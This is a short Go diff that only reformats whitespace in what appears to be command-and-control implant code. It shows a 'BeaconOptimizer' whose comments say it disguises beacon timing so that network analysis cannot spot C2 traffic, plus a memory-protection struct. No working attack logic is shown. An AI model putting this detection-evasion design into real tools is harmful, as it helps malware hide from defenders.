@@ -14,10 +14,10 @@ import (
 // BeaconOptimizer provides advanced beacon timing obfuscation.
 // This prevents network analysis from detecting C2 patterns.
 type BeaconOptimizer struct {
-	baseInterval    time.Duration
-	jitterPercent   float64
-	humanBehavior   bool
-	burstMode       bool
+	baseInterval  time.Duration
+	jitterPercent float64
+	humanBehavior bool
+	burstMode     bool
 }
 
 // NewBeaconOptimizer creates a beacon optimizer with human-like behavior.
@@ -46,10 +46,10 @@ func (bo *BeaconOptimizer) NextInterval() time.Duration {
 func (bo *BeaconOptimizer) humanLikeInterval() time.Duration {
 	// Simulate: user checks something, then gets distracted
 	patterns := []time.Duration{
-		bo.baseInterval,                          // Normal check
-		bo.baseInterval * 2,                      // Distracted
-		bo.baseInterval / 2,                      // Quick check
-		bo.baseInterval * 3,                      // Long distraction
+		bo.baseInterval,     // Normal check
+		bo.baseInterval * 2, // Distracted
+		bo.baseInterval / 2, // Quick check
+		bo.baseInterval * 3, // Long distraction
 		bo.baseInterval + bo.randomJitter(5*time.Second), // Random
 	}
 
@@ -110,8 +110,8 @@ type MemoryProtector struct {
 }
 
 type memProtection struct {
-	addr        uintptr
-	size        uintptr
+	addr         uintptr
+	size         uintptr
 	originalProt uint32
 }
 
